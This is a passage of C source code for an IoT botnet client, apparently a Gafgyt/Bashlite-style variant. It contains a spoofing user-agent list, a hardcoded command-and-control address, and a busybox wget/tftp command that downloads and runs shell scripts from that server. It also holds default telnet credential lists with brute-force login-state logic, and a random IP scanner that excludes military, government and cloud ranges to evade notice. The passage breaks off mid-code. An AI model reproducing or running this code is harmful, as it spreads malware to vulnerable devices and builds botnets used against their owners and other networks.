"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5pre) Gecko/2008032619 Linpus/3.0-0.49.3.0b5pre.lp Minefield/3.0b5pre",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.3a1pre) Gecko/20100128 Minefield/3.7a1pre",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a9pre) Gecko/2007100205 Minefield/3.0a9pre",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9a4pre) Gecko/20070402 Minefield/3.0a4pre",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041103 Firefox/1.0RC2",
"Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)",
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0",
"Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13",
"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.27 Safari/536.11",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)",
"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0",
"Mozilla/5.0 (PLAYSTATION 3 4.66) AppleWebKit/531.22.8 (KHTML, like Gecko)",
"Wget/1.12 (linux-gnu)",
"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.3",
"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile",
"Mozilla/5.0 (iPad; CPU OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E234 Safari/601.1",
"Mozilla/5.0 (Linux; Android 5.1; XT1032 Build/LPB23.13-58) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; Ha",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60",
"Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/536.8+ (KHTML, like Gecko) Version/5.1.5 Safari/534.55.3",
"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25",
"Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)",
"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
"Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)",
"Mozilla/5.0 (Admin Catalog; Windows NT 5.1; infobot.4942@yahoo.com)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
"HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)",
"Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
"Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1"
};

#define PRINTS //If you define this it will show prints but it will also make it easier to get botkilled(the prints were only added for testing)
#define Server_Botport 13
unsigned char *botnetNet[] = {"80.208.226.58:13"};
char *BBP = "cd /tmp; busybox wget http://80.208.226.58/w.sh; chmod 777 w.sh; busybox sh w.sh; busybox tftp 80.208.226.58 -c get t.sh; chmod 777 t.sh; busybox sh t.sh; rm -rf w.sh t.sh\r\n";
char *usernames[] = {"root\0", "Admin\0", "admin\0", "root\0", "default\0", "root\0", "root\0", "root\0", "default\0"};
char *passwords[] = {"\0", "\0", "admin\0", "vizxv\0", "default\0", "ttnet\0", "zlxx.\0", "root\0", "\0"}; 
char *tmpdirs[] = {"/dev/netslink/", "/tmp/", "/var/", "/dev/", "/var/run/", "/dev/shm/", "/mnt/", "/boot/", "/usr/", "/opt/", (char*)0};
char *advances[] = {":", "ogin", "sername", "assword", (char*)0};
char *fails[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", (char*)0};
char *successes[] = {"busybox", "$", "#", (char*)0};
char *advances2[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", "busybox", "$", "#", (char*)0};
int botnetServer = -1;
uint32_t *pids;
uint32_t botnetPid;
uint64_t numpids = 0;
struct in_addr ourIP;
struct in_addr ourPublicIP;
unsigned char macAddress[6] = {0};
char *inet_ntoa(struct in_addr in);
int KittyCommSock = 0;
int botnetPrint(int sock, char *formatStr, ...);
static uint32_t Q[4096], c = 362436;
void init_rand(uint32_t x) {
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
uint32_t rand_cmwc(void) {
	uint64_t t, a = 18782LL;
	static uint32_t i = 4095;
	uint32_t x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (uint32_t)(t >> 32);
	x = t + c;
	if (x < c) {
		x++;
		c++;
	}
	return (Q[i] = r - x);
}
static uint32_t x, y, z, w;
void rand_init(void) {
	x = time(NULL);
	y = getpid() ^ getppid();
	z = clock();
	w = z ^ y;
}
uint32_t rand_next(void) {
	uint32_t t = x;
	t ^= t << 11;
	t ^= t >> 8;
	x = y; y = z; z = w;
	w ^= w >> 19;
	w ^= t;
	return w;
}
void rand_str(char *str, int len) {
	while (len > 0) {
		if (len >= 4) {
			*((uint32_t *)str) = rand_next();
			str += sizeof (uint32_t);
			len -= sizeof (uint32_t);
		}
		else if (len >= 2) {
			*((uint16_t *)str) = rand_next() & 0xFFFF;
			str += sizeof (uint16_t);
			len -= sizeof (uint16_t);
		} else {
			*str++ = rand_next() & 0xFF;
			len--;
		}
	}
}
void rand_alphastr(uint8_t *str, int len) {
	const char alphaset[] = "kt8lmno5abghiiosdf63rlrs83rs9j0"; //keep this as is (randomize everytime you recompile)
	while (len > 0) {
		if (len >= sizeof (uint32_t)) {
			int i;
			uint32_t entropy = rand_next();
			for (i = 0; i < sizeof (uint32_t); i++) {
				uint8_t tmp = entropy & 0xff;
				entropy = entropy >> 8;
				tmp = tmp >> 3;
				*str++ = alphaset[tmp];
			}
			len -= sizeof (uint32_t);
		} else {
			*str++ = rand_next() % (sizeof (alphaset));
			len--;
		}
	}
}
int util_strlen(char *str) {
	int c = 0;
	while (*str++ != 0)
	c++;
	return c;
}
void util_memcpy(void *dst, void *src, int len) {
	char *r_dst = (char *)dst;
	char *r_src = (char *)src;
	while (len--)
	*r_dst++ = *r_src++;
}
int util_strcpy(char *dst, char *src) {
	int l = util_strlen(src);
	util_memcpy(dst, src, l + 1);
	return l;
}
static void printchar(unsigned char **str, int c) {
	if (str) {
		**str = c;
		++(*str);
	}
	else (void)write(1, &c, 1);
}
unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int got = 1, total = 0;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got == 0 ? NULL : buffer;
}
static int prints(unsigned char **out, const unsigned char *string, int width, int pad) {
	register int pc = 0, padchar = ' ';
	if (width > 0) {
		register int len = 0;
		register const unsigned char *ptr;
		for (ptr = string; *ptr; ++ptr) ++len;
		if (len >= width) width = 0;
		else width -= len;
		if (pad & PAD_ZERO) padchar = '0';
	}
	if (!(pad & PAD_RIGHT)) {
		for ( ; width > 0; --width) {
			printchar (out, padchar);
			++pc;
		}
	}
	for ( ; *string ; ++string) {
		printchar (out, *string);
		++pc;
	}
	for ( ; width > 0; --width) {
		printchar (out, padchar);
		++pc;
	}
	return pc;
}
static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase) {
	unsigned char print_buf[PRINT_BUF_LEN];
	register unsigned char *s;
	register int t, neg = 0, pc = 0;
	register unsigned int u = i;
	if (i == 0) {
		print_buf[0] = '0';
		print_buf[1] = '\0';
		return prints (out, print_buf, width, pad);
	}
	if (sg && b == 10 && i < 0) {
		neg = 1;
		u = -i;
	}
	s = print_buf + PRINT_BUF_LEN-1;
	*s = '\0';
	while (u) {
		t = u % b;
		if( t >= 10 )
		t += letbase - '0' - 10;
		*--s = t + '0';
		u /= b;
	}
	if (neg) {
		if( width && (pad & PAD_ZERO) ) {
			printchar (out, '-');
			++pc;
			--width;
		} else {
			*--s = '-';
		}	
	}
	return pc + prints (out, s, width, pad);
}
static int print(unsigned char **out, const unsigned char *format, va_list args ) {
	register int width, pad;
	register int pc = 0;
	unsigned char scr[2];
	for (; *format != 0; ++format) {
		if (*format == '%') {
			++format;
			width = pad = 0;
			if (*format == '\0') break;
			if (*format == '%') goto out;
			if (*format == '-') {
				++format;
				pad = PAD_RIGHT;
			}
			while (*format == '0') {
				++format;
				pad |= PAD_ZERO;
			}
			for ( ; *format >= '0' && *format <= '9'; ++format) {
				width *= 10;
				width += *format - '0';
			}
			if( *format == 's' ) {
				register char *s = (char *)va_arg( args, intptr_t );
				pc += prints (out, s?s:"(null)", width, pad);
				continue;
			}
			if( *format == 'd' ) {
				pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
				continue;
			}
			if( *format == 'x' ) {
				pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
				continue;
			}
			if( *format == 'X' ) {
				pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
				continue;
			}
			if( *format == 'u' ) {
				pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
				continue;
			}
			if( *format == 'c' ) {
				scr[0] = (unsigned char)va_arg( args, int );
				scr[1] = '\0';
				pc += prints (out, scr, width, pad);
				continue;
			}
		} else {
			out:
			printchar (out, *format);
			++pc;
		}
	}
	if (out) **out = '\0';
	va_end( args );
	return pc;
}
int szprintf(unsigned char *out, const unsigned char *format, ...) {
	va_list args;
	va_start( args, format );
	return print( &out, format, args );
}
int botnetPrint(int sock, char *formatStr, ...) {
	unsigned char *textBuffer = malloc(2048);
	memset(textBuffer, 0, 2048);
	char *orig = textBuffer;
	va_list args;
	va_start(args, formatStr);
	print(&textBuffer, formatStr, args);
	va_end(args);
	orig[strlen(orig)] = '\n';
	int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
	free(orig);
	return q;
}
void trim(char *str) {
	int i;
	int begin = 0;
	int end = strlen(str) - 1;
	while (isspace(str[begin])) begin++;
	while ((end >= begin) && isspace(str[end])) end--;
	for (i = begin; i <= end; i++) str[i - begin] = str[i];
	str[i - begin] = '\0';
}
int getHost(unsigned char *toGet, struct in_addr *i) {
	struct hostent *h;
	if((i->s_addr = inet_addr(toGet)) == -1) return 1;
	return 0;
}
int recvLine(int socket, unsigned char *buf, int bufsize) {
	memset(buf, 0, bufsize);
	fd_set myset;
	struct timeval tv;
	tv.tv_sec = 30;
	tv.tv_usec = 0;
	FD_ZERO(&myset);
	FD_SET(socket, &myset);
	int selectRtn, retryCount;
	if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
		while(retryCount < 10) {
			tv.tv_sec = 30;
			tv.tv_usec = 0;
			FD_ZERO(&myset);
			FD_SET(socket, &myset);
			if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
				retryCount++;
				continue;
			}
			break;
		}
	}
	unsigned char tmpchr;
	unsigned char *cp;
	int count = 0;
	cp = buf;
	while(bufsize-- > 1) {
		if(recv(KittyCommSock, &tmpchr, 1, 0) != 1) {
			*cp = 0x00;
			return -1;
		}
		*cp++ = tmpchr;
		if(tmpchr == '\n') break;
		count++;
	}
	*cp = 0x00;
	return count;
}
int connectTimeout(int fd, char *host, int port, int timeout) {
	struct sockaddr_in dest_addr;
	fd_set myset;
	struct timeval tv;
	socklen_t lon;
	int valopt;
	long arg = fcntl(fd, F_GETFL, NULL);
	arg |= O_NONBLOCK;
	fcntl(fd, F_SETFL, arg);
	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(port);
	if(getHost(host, &dest_addr.sin_addr)) return 0;
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
	int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
	if (res < 0) {
		if (errno == EINPROGRESS) {
			tv.tv_sec = timeout;
			tv.tv_usec = 0;
			FD_ZERO(&myset);
			FD_SET(fd, &myset);
			if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
				lon = sizeof(int);
				getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
				if (valopt) return 0;
			}
			else return 0;
		}
		else return 0;
	}
	arg = fcntl(fd, F_GETFL, NULL);
	arg &= (~O_NONBLOCK);
	fcntl(fd, F_SETFL, arg);
	return 1;
}
int listFork() {
	uint32_t parent, *newpids, i;
	parent = fork();
	if (parent <= 0) return parent;
	numpids++;
	newpids = (uint32_t*)malloc((numpids + 1) * 4);
	for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
	newpids[numpids - 1] = parent;
	free(pids);
	pids = newpids;
	return parent;
}
struct telstate_t {
	int fd;
	unsigned int ip;
	unsigned char state;
	unsigned char complete;
	unsigned char usernameInd;
	unsigned char passwordInd;
	unsigned char tempDirInd;
	unsigned int totalTimeout;
	unsigned short bufUsed;
	char *sockbuf;
};
const char* get_telstate_host(struct telstate_t* telstate) {
	struct in_addr in_addr_ip;
	in_addr_ip.s_addr = telstate->ip;
	return inet_ntoa(in_addr_ip);
}
int read_until_response(int fd, int timeout_usec, char* buffer, int buf_size, char** strings) {
	int num_bytes, i;
	memset(buffer, 0, buf_size);
	num_bytes = read_with_timeout(fd, timeout_usec, buffer, buf_size);
	if(buffer[0] == 0xFF) {
		negotiate(fd, buffer, 3);
	}
	if(contains_string(buffer, strings)) {
		return 1;
	}
	return 0;
}
int read_with_timeout(int fd, int timeout_usec, char* buffer, int buf_size) {
	fd_set read_set;
	struct timeval tv;
	tv.tv_sec = 0;
	tv.tv_usec = timeout_usec;
	FD_ZERO(&read_set);
	FD_SET(fd, &read_set);
	if (select(fd+1, &read_set, NULL, NULL, &tv) < 1)
	return 0;
	return recv(fd, buffer, buf_size, 0);
}
void advance_state(struct telstate_t* telstate, int new_state) {
	if(new_state == 0) {
		close(telstate->fd);
	}
	telstate->totalTimeout = 0;
	telstate->state = new_state;
	memset((telstate->sockbuf), 0, BUFFER_SIZE);
}
void reset_telstate(struct telstate_t* telstate) {
	advance_state(telstate, 0);
	telstate->complete = 1;
}
int contains_success(char* buffer) {
	return contains_string(buffer, successes);
}
int contains_fail(char* buffer) {
	return contains_string(buffer, fails);
}
int contains_response(char* buffer) {
	return contains_success(buffer) || contains_fail(buffer);
}
int contains_string(char* buffer, char** strings) {
	int num_strings = 0, i = 0;
	for(num_strings = 0; strings[++num_strings] != 0; );
	for(i = 0; i < num_strings; i++) {
		if(strcasestr(buffer, strings[i])) {
			return 1;
		}
	}
	return 0;
}
int negotiate(int sock, unsigned char *buf, int len) {
	unsigned char c;
	switch (buf[1]) {
		case CMD_IAC:  return 0;
		case CMD_WILL:
		case CMD_WONT:
		case CMD_DO:
		case CMD_DONT:
		c = CMD_IAC;
		send(sock, &c, 1, MSG_NOSIGNAL);
		if (CMD_WONT == buf[1]) c = CMD_DONT;
		else if (CMD_DONT == buf[1]) c = CMD_WONT;
		else if (OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
		else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
		send(sock, &c, 1, MSG_NOSIGNAL);
		send(sock, &(buf[2]), 1, MSG_NOSIGNAL);
		break;
		default:
		break;
	}
	return 0;
}
int matchPrompt(char *bufStr) {
	char *prompts = ":>%$#\0";
	int bufLen = strlen(bufStr);
	int i, q = 0;
	for(i = 0; i < strlen(prompts); i++) {
		while(bufLen > q && (*(bufStr + bufLen - q) == 0x00 || *(bufStr + bufLen - q) == ' ' || *(bufStr + bufLen - q) == '\r' || *(bufStr + bufLen - q) == '\n')) q++;
		if(*(bufStr + bufLen - q) == prompts[i]) return 1;
	}
	return 0;
}
int readUntil(int fd, char *toFind, int matchLePrompt, int timeout, int timeoutusec, char *buffer, int bufSize, int initialIndex) {
	int bufferUsed = initialIndex, got = 0, found = 0;
	fd_set myset;
	struct timeval tv;
	tv.tv_sec = timeout;
	tv.tv_usec = timeoutusec;
	unsigned char *initialRead = NULL;
	while(bufferUsed + 2 < bufSize && (tv.tv_sec > 0 || tv.tv_usec > 0)) {
		FD_ZERO(&myset);
		FD_SET(fd, &myset);
		if (select(fd+1, &myset, NULL, NULL, &tv) < 1) break;
		initialRead = buffer + bufferUsed;
		got = recv(fd, initialRead, 1, 0);
		if(got == -1 || got == 0) return 0;
		bufferUsed += got;
		if(*initialRead == 0xFF) {
			got = recv(fd, initialRead + 1, 2, 0);
			if(got == -1 || got == 0) return 0;
			bufferUsed += got;
			if(!negotiate(fd, initialRead, 3)) return 0;
		} else {
			if(strstr(buffer, toFind) != NULL || (matchLePrompt && matchPrompt(buffer))) { found = 1; break; }
		}
	}
	if(found) return 1;
	return 0;
}
in_addr_t GIP() { //Like my ipstates?
	static uint8_t ipState[4] = {0};
	ipState[0] = rand() % 223;
	ipState[1] = rand() % 255;
	ipState[2] = rand() % 255;
	ipState[3] = rand() % 255;
	while(
	(ipState[0] == 127) ||                                                                  //Loopback
	(ipState[0] == 0) ||                                                                    //Invalid address space
	(ipState[0] == 3) ||                                                                    //General Electric Company
	(ipState[0] == 15) ||                                                                   //Hewlett-Packard Company
	(ipState[0] == 56) ||                                                                   //US Postal Service
	(ipState[0] == 10) ||                                                                   //Internal network
	(ipState[0] == 25) ||                                                                   //Some more
	(ipState[0] == 49) ||                                                                   //Some more
	(ipState[0] == 50) ||                                                                   //Some more
	(ipState[0] == 137) ||                                                                  //Some more
	(ipState[0] == 6) ||                                                                    //Department of Defense
	(ipState[0] == 7) ||                                                                    //Department of Defense
	(ipState[0] == 11) ||                                                                   //Department of Defense
	(ipState[0] == 21) ||                                                                   //Department of Defense
	(ipState[0] == 22) ||                                                                   //Department of Defense
	(ipState[0] == 26) ||                                                                   //Department of Defense
	(ipState[0] == 28) ||                                                                   //Department of Defense
	(ipState[0] == 29) ||                                                                   //Department of Defense
	(ipState[0] == 30) ||                                                                   //Department of Defense
	(ipState[0] == 33) ||                                                                   //Department of Defense
	(ipState[0] == 55) ||                                                                   //Department of Defense
	(ipState[0] == 214) ||                                                                  //Department of Defense
	(ipState[0] == 215) ||                                                                  //Department of Defense
	(ipState[0] == 192 && ipState[1] == 168) ||                                             //Internal network
	(ipState[0] == 146 && ipState[1] == 17) ||                                              //Internal network
	(ipState[0] == 146 && ipState[1] == 80) ||                                              //IANA NAT reserved
	(ipState[0] == 146 && ipState[1] == 98) ||                                              //IANA NAT reserved
	(ipState[0] == 146 && ipState[1] == 154) ||                                             //IANA Special use
	(ipState[0] == 147 && ipState[1] == 159) ||                                             //Some more
	(ipState[0] == 148 && ipState[1] == 114) ||                                             //Some more
	(ipState[0] == 150 && ipState[1] == 125) ||                                             //Some more
	(ipState[0] == 150 && ipState[1] == 133) ||                                             //Some more
	(ipState[0] == 150 && ipState[1] == 144) ||                                             //Some more
	(ipState[0] == 150 && ipState[1] == 149) ||                                             //Some more
	(ipState[0] == 150 && ipState[1] == 157) ||                                             //Some more
	(ipState[0] == 150 && ipState[1] == 184) ||                                             //Some more
	(ipState[0] == 150 && ipState[1] == 190) ||                                             //Some more
	(ipState[0] == 150 && ipState[1] == 196) ||                                             //Some more
	(ipState[0] == 152 && ipState[1] == 82) ||                                              //Some more
	(ipState[0] == 152 && ipState[1] == 229) ||                                             //Some more
	(ipState[0] == 157 && ipState[1] == 202) ||                                             //Some more
	(ipState[0] == 157 && ipState[1] == 217) ||                                             //Some more
	(ipState[0] == 161 && ipState[1] == 124) ||                                             //Some more
	(ipState[0] == 162 && ipState[1] == 32) ||                                              //Some more
	(ipState[0] == 155 && ipState[1] == 96) ||                                              //Some more
	(ipState[0] == 155 && ipState[1] == 149) ||                                             //Some more
	(ipState[0] == 155 && ipState[1] == 155) ||                                             //Some more
	(ipState[0] == 155 && ipState[1] == 178) ||                                             //Some more
	(ipState[0] == 164 && ipState[1] == 158) ||                                             //Some more
	(ipState[0] == 156 && ipState[1] == 9) ||                                               //Some more
	(ipState[0] == 167 && ipState[1] == 44) ||                                              //Some more
	(ipState[0] == 168 && ipState[1] == 68) ||                                              //Some more
	(ipState[0] == 168 && ipState[1] == 85) ||                                              //Some more
	(ipState[0] == 168 && ipState[1] == 102) ||                                             //Some more
	(ipState[0] == 203 && ipState[1] == 59) ||                                              //Some more
	(ipState[0] == 204 && ipState[1] == 34) ||                                              //Some more
	(ipState[0] == 207 && ipState[1] == 30) ||                                              //Some more
	(ipState[0] == 117 && ipState[1] == 55) ||                                              //Some more
	(ipState[0] == 117 && ipState[1] == 56) ||                                              //Some more
	(ipState[0] == 80 && ipState[1] == 235) ||                                              //Some more
	(ipState[0] == 207 && ipState[1] == 120) ||                                             //Some more
	(ipState[0] == 209 && ipState[1] == 35) ||                                              //Some more
	(ipState[0] == 64 && ipState[1] == 70) ||                                               //Some more
	(ipState[0] == 172 && ipState[1] >= 16 && ipState[1] < 32) ||                           //Some more
	(ipState[0] == 100 && ipState[1] >= 64 && ipState[1] < 127) ||                          //Some more
	(ipState[0] == 169 && ipState[1] == 254) ||                                             //Some more
	(ipState[0] == 198 && ipState[1] >= 18 && ipState[1] < 20) ||                           //Some more
	(ipState[0] == 64 && ipState[1] >= 69 && ipState[1] < 227) ||                           //Some more
	(ipState[0] == 128 && ipState[1] >= 35 && ipState[1] < 237) ||                          //Some more
	(ipState[0] == 129 && ipState[1] >= 22 && ipState[1] < 255) ||                          //Some more
	(ipState[0] == 130 && ipState[1] >= 40 && ipState[1] < 168) ||                          //Some more
	(ipState[0] == 131 && ipState[1] >= 3 && ipState[1] < 251) ||                           //Some more
	(ipState[0] == 132 && ipState[1] >= 3 && ipState[1] < 251) ||                           //Some more
	(ipState[0] == 134 && ipState[1] >= 5 && ipState[1] < 235) ||                           //Some more
	(ipState[0] == 136 && ipState[1] >= 177 && ipState[1] < 223) ||                         //Some more
	(ipState[0] == 138 && ipState[1] >= 13 && ipState[1] < 194) ||                          //Some more
	(ipState[0] == 139 && ipState[1] >= 31 && ipState[1] < 143) ||                          //Some more
	(ipState[0] == 140 && ipState[1] >= 1 && ipState[1] < 203) ||                           //Some more
	(ipState[0] == 143 && ipState[1] >= 45 && ipState[1] < 233) ||                          //Some more
	(ipState[0] == 144 && ipState[1] >= 99 && ipState[1] < 253) ||                          //Some more
	(ipState[0] == 146 && ipState[1] >= 165 && ipState[1] < 166) ||                         //Some more
	(ipState[0] == 147 && ipState[1] >= 35 && ipState[1] < 43) ||                           //Some more
	(ipState[0] == 147 && ipState[1] >= 103 && ipState[1] < 105) ||                         //Some more
	(ipState[0] == 147 && ipState[1] >= 168 && ipState[1] < 170) ||                         //Some more
	(ipState[0] == 147 && ipState[1] >= 198 && ipState[1] < 200) ||                         //Some more
	(ipState[0] == 147 && ipState[1] >= 238 && ipState[1] < 255) ||                         //Some more
	(ipState[0] == 150 && ipState[1] >= 113 && ipState[1] < 115) ||                         //Some more
	(ipState[0] == 152 && ipState[1] >= 151 && ipState[1] < 155) ||                         //Some more
	(ipState[0] == 153 && ipState[1] >= 21 && ipState[1] < 32) ||                           //Some more
	(ipState[0] == 155 && ipState[1] >= 5 && ipState[1] < 10) ||                            //Some more
	(ipState[0] == 155 && ipState[1] >= 74 && ipState[1] < 89) ||                           //Some more
	(ipState[0] == 155 && ipState[1] >= 213 && ipState[1] < 222) ||                         //Some more
	(ipState[0] == 157 && ipState[1] >= 150 && ipState[1] < 154) ||                         //Some more
	(ipState[0] == 158 && ipState[1] >= 1 && ipState[1] < 21) ||                            //Some more
	(ipState[0] == 158 && ipState[1] >= 235 && ipState[1] < 247) ||                         //Some more
	(ipState[0] == 159 && ipState[1] >= 120 && ipState[1] < 121) ||                         //Some more
	(ipState[0] == 160 && ipState[1] >= 132 && ipState[1] < 151) ||                         //Some more
	(ipState[0] == 64 && ipState[1] >= 224 && ipState[1] < 227) ||                          //Some more
	(ipState[0] == 162 && ipState[1] >= 45 && ipState[1] < 47) ||                           //CIA 
	(ipState[0] == 163 && ipState[1] >= 205 && ipState[1] < 207) ||                         //NASA Kennedy Space Center
	(ipState[0] == 164 && ipState[1] >= 45 && ipState[1] < 50) ||                           //NASA Kennedy Space Center
	(ipState[0] == 164 && ipState[1] >= 217 && ipState[1] < 233) ||                         //NASA Kennedy Space Center
	(ipState[0] == 169 && ipState[1] >= 252 && ipState[1] < 254) ||                         //U.S. Department of State
	(ipState[0] == 199 && ipState[1] >= 121 && ipState[1] < 254) ||                         //Naval Air Systems Command, VA
	(ipState[0] == 205 && ipState[1] >= 1 && ipState[1] < 118) ||                           //Department of the Navy, Space and Naval Warfare System Command, Washington DC - SPAWAR
	(ipState[0] == 207 && ipState[1] >= 60 && ipState[1] < 62) ||                           //FBI controlled Linux servers & IPs/IP-Ranges
	(ipState[0] == 104 && ipState[1] >= 16 && ipState[1] < 31) ||                           //Cloudflare
	(ipState[0] == 188 && ipState[1] == 166) ||                                             //Digital Ocean
	(ipState[0] == 188 && ipState[1] == 226) ||                                             //Digital Ocean
	(ipState[0] == 159 && ipState[1] == 203) ||                                             //Digital Ocean
	(ipState[0] == 162 && ipState[1] == 243) ||                                             //Digital Ocean
	(ipState[0] == 45 && ipState[1] == 55) ||                                               //Digital Ocean
	(ipState[0] == 178 && ipState[1] == 62) ||                                              //Digital Ocean
	(ipState[0] == 104 && ipState[1] == 131) ||                                             //Digital Ocean
	(ipState[0] == 104 && ipState[1] == 236) ||                                             //Digital Ocean
	(ipState[0] == 107 && ipState[1] == 170) ||                                             //Digital Ocean
	(ipState[0] == 138 && ipState[1] == 197) ||                                             //Digital Ocean
	(ipState[0] == 138 && ipState[1] == 68) ||                                              //Digital Ocean
	(ipState[0] == 139 && ipState[1] == 59) ||                                              //Digital Ocean
	(ipState[0] == 146 && ipState[1] == 185 && ipState[2] >= 128 && ipState[2] < 191) ||    //Digital Ocean
	(ipState[0] == 163 && ipState[1] == 47 && ipState[2] >= 10 && ipState[2] < 11) ||       //Digital Ocean
	(ipState[0] == 174 && ipState[1] == 138 && ipState[2] >= 1 && ipState[2] < 127) ||      //Digital Ocean
	(ipState[0] == 192 && ipState[1] == 241 && ipState[2] >= 128 && ipState[2] < 255) ||    //Digital Ocean
	(ipState[0] == 198 && ipState[1] == 199 && ipState[2] >= 64 && ipState[2] < 127) ||     //Digital Ocean
	(ipState[0] == 198 && ipState[1] == 211 && ipState[2] >= 96 && ipState[2] < 127) ||     //Digital Ocean
